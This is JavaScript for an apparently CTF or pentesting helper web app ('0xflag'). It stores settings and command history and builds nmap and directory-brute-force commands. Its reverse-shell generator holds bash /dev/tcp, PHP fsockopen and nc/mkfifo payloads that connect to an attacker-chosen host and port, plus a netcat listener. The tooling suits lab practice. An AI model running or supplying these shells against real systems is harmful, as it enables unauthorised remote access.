document.addEventListener("DOMContentLoaded", () => {
  // --- CONFIGURACIÓN GLOBAL EN LOCALSTORAGE ---
  function getGlobalConfig() {
    return JSON.parse(localStorage.getItem('0xflag_config')) || {
      lhost: '',
      rhost: '',
      lport: '4444',
      wordlist: '/usr/share/wordlists/dirb/common.txt'
    };
  }

  function saveGlobalConfig(config) {
    localStorage.setItem('0xflag_config', JSON.stringify(config));
  }

  const globalConfig = getGlobalConfig();

  // --- REGISTRO DE HISTORIAL LOCAL ---
  function logToHistory(commandText, moduleName = null) {
    if (!commandText) return;
    const cleanCmd = commandText.trim();
    if (cleanCmd.startsWith("Completa") || cleanCmd.startsWith("Esperando")) return;

    // Detectar módulo automáticamente según el título si no se especifica
    if (!moduleName) {
      const pageTitle = document.title || '';
      if (pageTitle.includes('Nmap')) moduleName = 'Nmap';
      else if (pageTitle.includes('Reverse')) moduleName = 'Reverse Shell';
      else if (pageTitle.includes('TTY')) moduleName = 'TTY Assistant';
      else if (pageTitle.includes('Discovery')) moduleName = 'Discovery';
      else if (pageTitle.includes('PEASS')) moduleName = 'PEASS-ng';
      else moduleName = 'General';
    }

    let history = JSON.parse(localStorage.getItem('0xflag_history')) || [];
    const newEntry = {
      module: moduleName,
      command: cleanCmd,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
      date: new Date().toLocaleDateString()
    };

    if (history.length === 0 || history[0].command !== cleanCmd) {
      history.unshift(newEntry);
      if (history.length > 50) history.pop();
      localStorage.setItem('0xflag_history', JSON.stringify(history));
    }
  }

  // --- LÓGICA DE COPIADO ---
  function copyText(text, btnElement) {
    if (!text) return;

    const textArea = document.createElement("textarea");
    textArea.value = text;
    textArea.style.position = "fixed";
    textArea.style.left = "-9999px";
    document.body.appendChild(textArea);
    textArea.select();

    try {
      document.execCommand("copy");
      if (btnElement) {
        const originalHtml = btnElement.innerHTML;
        btnElement.classList.add("copiado");
        btnElement.innerHTML = '✓';

        setTimeout(() => {
          btnElement.classList.remove("copiado");
          btnElement.innerHTML = originalHtml;
        }, 1500);
      }
    } catch (err) {
      console.error("Error al copiar", err);
    }
    document.body.removeChild(textArea);
  }

  document.querySelectorAll(".btn-copy").forEach(btn => {
    btn.addEventListener("click", () => {
      const targetId = btn.getAttribute("data-target");
      if (!targetId) return;

      const targetEl = document.getElementById(targetId);
      if (!targetEl) return;

      let textToCopy = (targetEl.tagName === 'INPUT' || targetEl.tagName === 'TEXTAREA') 
        ? targetEl.value 
        : targetEl.innerText;

      copyText(textToCopy, btn);
      logToHistory(textToCopy);
    });
  });

  // --- RENDERIZADO Y LIMPIEZA DEL HISTORIAL (history.html) ---
  const historyTableBody = document.getElementById('history-table-body');
  const btnClearHistory = document.getElementById('btn-clear-history');

  if (historyTableBody) {
    function renderHistoryTable() {
      let history = JSON.parse(localStorage.getItem('0xflag_history')) || [];
      historyTableBody.innerHTML = '';

      if (history.length === 0) {
        historyTableBody.innerHTML = `
          <tr>
            <td colspan="4" class="text-center py-4 text-white-50">No hay comandos registrados aún.</td>
          </tr>`;
        return;
      }

      const fragment = document.createDocumentFragment();

      history.forEach((item) => {
        const tr = document.createElement('tr');

        const tdTime = document.createElement('td');
        tdTime.className = 'text-white-50';
        tdTime.innerText = item.timestamp || '--:--';

        const tdModule = document.createElement('td');
        tdModule.innerHTML = `<span class="badge bg-dark text-success border border-success">${item.module || 'General'}</span>`;

        const tdCommand = document.createElement('td');
        tdCommand.className = 'text-break font-monospace';
        tdCommand.innerText = item.command;

        const tdAction = document.createElement('td');
        tdAction.className = 'text-end';

        const copyBtn = document.createElement('button');
        copyBtn.className = 'btn btn-sm btn-outline-success';
        copyBtn.innerHTML = '<i class="bi bi-clipboard"></i>';
        copyBtn.title = 'Copiar comando';
        copyBtn.onclick = () => copyText(item.command, copyBtn);

        tdAction.appendChild(copyBtn);

        tr.appendChild(tdTime);
        tr.appendChild(tdModule);
        tr.appendChild(tdCommand);
        tr.appendChild(tdAction);

        fragment.appendChild(tr);
      });

      historyTableBody.appendChild(fragment);
    }

    if (btnClearHistory) {
      btnClearHistory.addEventListener('click', () => {
        localStorage.removeItem('0xflag_history');
        renderHistoryTable();
      });
    }

    renderHistoryTable();
  }

  // --- LÓGICA DE SETTINGS (CONFIGURACIÓN GLOBAL) ---
  const settingsForm = document.getElementById('settings-form');
  const setLhost = document.getElementById('set_lhost') || document.getElementById('cfg_lhost') || (settingsForm && document.getElementById('lhost'));
  const setRhost = document.getElementById('set_rhost') || document.getElementById('cfg_rhost') || document.getElementById('set_target') || (settingsForm && document.getElementById('rhost'));
  const setLport = document.getElementById('set_lport') || document.getElementById('cfg_lport') || (settingsForm && document.getElementById('lport'));
  const setWordlist = document.getElementById('set_wordlist') || document.getElementById('cfg_wordlist') || (settingsForm && document.getElementById('wordlist'));

  if (setLhost || setRhost || setLport || setWordlist) {
    if (setLhost) setLhost.value = globalConfig.lhost || '';
    if (setRhost) setRhost.value = globalConfig.rhost || '';
    if (setLport) setLport.value = globalConfig.lport || '4444';
    if (setWordlist) setWordlist.value = globalConfig.wordlist || '/usr/share/wordlists/dirb/common.txt';

    function saveSettingsFromUI() {
      const updatedConfig = {
        lhost: setLhost ? setLhost.value.trim() : globalConfig.lhost,
        rhost: setRhost ? setRhost.value.trim() : globalConfig.rhost,
        lport: setLport ? setLport.value.trim() : globalConfig.lport,
        wordlist: setWordlist ? setWordlist.value.trim() : globalConfig.wordlist
      };
      saveGlobalConfig(updatedConfig);
    }

    [setLhost, setRhost, setLport, setWordlist].forEach(input => {
      if (input) {
        input.addEventListener('input', saveSettingsFromUI);
        input.addEventListener('change', saveSettingsFromUI);
      }
    });

    if (settingsForm) {
      settingsForm.addEventListener('submit', (e) => {
        e.preventDefault();
        saveSettingsFromUI();
      });
    }
  }

  // --- LÓGICA DE NMAP ---
  const nmapIpInput = document.getElementById('nmap_ip');
  const nmapSelect = document.getElementById('nmap_type');

  if (nmapIpInput && nmapSelect && window.nmapDataDB) {
    const nmapContainer = document.getElementById('nmap-output-container');
    const nmapOutput = document.getElementById('nmap-output-text');

    if (!nmapIpInput.value && globalConfig.rhost) {
      nmapIpInput.value = globalConfig.rhost;
    }

    function updateNmapCommand() {
      const scanKey = nmapSelect.value;
      let ip = nmapIpInput.value.trim() || "{target_ip}";

      if (!scanKey) {
        if (nmapContainer) nmapContainer.style.display = 'none';
        return;
      }

      const rawCommand = window.nmapDataDB[scanKey];
      if (rawCommand && nmapContainer && nmapOutput) {
        nmapContainer.style.display = 'block';
        nmapOutput.value = rawCommand.replace('{ip}', ip);
      }
    }

    nmapSelect.addEventListener('change', updateNmapCommand);
    nmapIpInput.addEventListener('input', updateNmapCommand);
    updateNmapCommand();
  }

  // --- LÓGICA DE REVERSE SHELL ---
  const rsHost = document.getElementById("lhost");
  if (rsHost) {
    const rsPort = document.getElementById("lport");
    const rsOutput = document.getElementById("output");
    const rsListener = document.getElementById("listener");
    const rsUrlEncode = document.getElementById("urlencode");
    const rsCards = document.querySelectorAll(".shell-card");

    if (!rsHost.value && globalConfig.lhost) {
      rsHost.value = globalConfig.lhost;
    }
    if (rsPort && (!rsPort.value || rsPort.value === '4444') && globalConfig.lport) {
      rsPort.value = globalConfig.lport;
    }

    function generateShell() {
      if (!rsHost.value || !rsPort.value) {
        if (rsOutput) rsOutput.innerText = "Completa IP y Puerto arriba...";
        if (rsListener) rsListener.innerText = "nc -lvnp <PUERTO>";
        return;
      }

      let ip = rsHost.value.trim();
      let p = rsPort.value.trim();

      if (rsUrlEncode && rsUrlEncode.checked) {
        ip = encodeURIComponent(ip);
        p = encodeURIComponent(p);
      }

      const activeCard = document.querySelector(".shell-card.active input");
      const type = activeCard ? activeCard.value : 'bash';

      let command = "";
      switch (type) {
        case 'bash':
          command = `bash -i >& /dev/tcp/${ip}/${p} 0>&1`;
          break;
        case 'php':
          command = `php -r '$sock=fsockopen("${ip}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`;
          break;
        case 'nc':
          command = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f`;
          break;
        default:
          command = `bash -i >& /dev/tcp/${ip}/${p} 0>&1`;
      }

      if (rsOutput) rsOutput.innerText = command;
      if (rsListener) rsListener.innerText = `nc -lvnp ${rsPort.value}`;
    }

    rsCards.forEach(card => {
      card.addEventListener("click", () => {
        rsCards.forEach(c => c.classList.remove("active"));
        card.classList.add("active");
        const radio = card.querySelector("input");
        if (radio) radio.checked = true;
        generateShell();
      });
    });

    [rsHost, rsPort, rsUrlEncode].forEach(el => {
      if (el) {
        el.addEventListener("input", generateShell);
        el.addEventListener("change", generateShell);
      }
    });

    generateShell();
  }

  // --- LÓGICA DE TTY ---
  const ttySelect = document.getElementById('tty_select');
  if (ttySelect && window.ttyDataDB) {
    const dom = {
      container: document.getElementById('tty-output-container'),
      title: document.getElementById('tty-title-display'),
      desc: document.getElementById('tty-desc-display'),
      list: document.getElementById('tty-commands-list'),
      notesBox: document.getElementById('tty-notes-box'),
      notesText: document.getElementById('tty-notes-text')
    };

    ttySelect.addEventListener('change', function() {
      const key = this.value;
      const data = window.ttyDataDB[key];

      if (!key || !data) {
        if (dom.container) dom.container.style.display = 'none';
        return;
      }

      if (dom.container) dom.container.style.display = 'block';
      if (dom.title) dom.title.innerText = "> " + data.name;
      if (dom.desc) dom.desc.innerText = data.description || "TTY Upgrade";
      if (dom.list) dom.list.innerHTML = '';

      if (Array.isArray(data.commands) && dom.list) {
        const fragment = document.createDocumentFragment();

        data.commands.forEach((cmd, index) => {
          const row = document.createElement('div');
          row.className = "terminal-row d-flex align-items-center mb-2";

          const num = document.createElement('span');
          num.className = "me-3 select-none text-muted";
          num.innerText = `${index + 1}.`;

          const input = document.createElement('input');
          input.type = "text";
          input.className = "form-control terminal-input";
          input.value = cmd;
          input.readOnly = true;

          const btn = document.createElement('button');
          btn.className = "btn-copy ms-2";
          btn.title = "Copiar línea";
          btn.innerHTML = '📋';

          btn.onclick = () => {
            copyText(cmd, btn);
            logToHistory(cmd, 'TTY Assistant');
          };

          row.appendChild(num);
          row.appendChild(input);
          row.appendChild(btn);
          fragment.appendChild(row);
        });

        dom.list.appendChild(fragment);
      }

      if (data.notes && dom.notesBox && dom.notesText) {
        dom.notesBox.style.display = 'block';
        dom.notesText.innerText = data.notes;
      } else if (dom.notesBox) {
        dom.notesBox.style.display = 'none';
      }
    });
  }

  // --- LÓGICA DE DISCOVERY ---
  const discoUrl = document.getElementById("disco_url");
  if (discoUrl && window.discoveryToolsDB) {
    const discoWordlist = document.getElementById("disco_wordlist");
    const discoExt = document.getElementById("disco_extensions");
    const discoTool = document.getElementById("disco_tool");
    const discoContainer = document.getElementById("disco-output-container");
    const discoText = document.getElementById("disco-output-text");

    if (!discoUrl.value && globalConfig.rhost) {
      discoUrl.value = globalConfig.rhost;
    }
    if (discoWordlist && globalConfig.wordlist) {
      discoWordlist.value = globalConfig.wordlist;
    }

    function updateDiscoveryCommand() {
      let url = discoUrl.value.trim();
      const wordlist = (discoWordlist && discoWordlist.value.trim()) || "/usr/share/wordlists/dirb/common.txt";
      let extensions = discoExt ? discoExt.value.trim() : "";
      const toolKey = discoTool ? discoTool.value : "gobuster";

      if (!url) {
        if (discoContainer) discoContainer.style.display = "none";
        return;
      }

      let rawCommand = window.discoveryToolsDB[toolKey];
      if (!rawCommand) return;

      let extString = "";
      if (toolKey === 'ffuf') {
        if (!url.includes("FUZZ")) {
          url = url.endsWith("/") ? `${url}FUZZ` : `${url}/FUZZ`;
        }
        if (extensions) {
          const extArray = extensions.split(',').map(e => e.trim().startsWith('.') ? e.trim() : `.${e.trim()}`);
          extString = `-e ${extArray.join(',')}`;
        }
      } else if (toolKey === 'gobuster' || toolKey === 'dirsearch') {
        if (extensions) {
          const cleanExt = extensions.replace(/\./g, '');
          extString = `-x ${cleanExt}`;
        }
      }

      let finalCommand = rawCommand
        .replace('{url}', url)
        .replace('{wordlist}', wordlist)
        .replace('{extensions}', extString);

      finalCommand = finalCommand.replace(/\s+/g, ' ').trim();

      if (discoContainer && discoText) {
        discoContainer.style.display = "block";
        discoText.innerText = finalCommand;
      }
    }

    [discoUrl, discoWordlist, discoExt, discoTool].forEach(el => {
      if (el) {
        el.addEventListener("input", updateDiscoveryCommand);
        el.addEventListener("change", updateDiscoveryCommand);
      }
    });

    updateDiscoveryCommand();
  }
});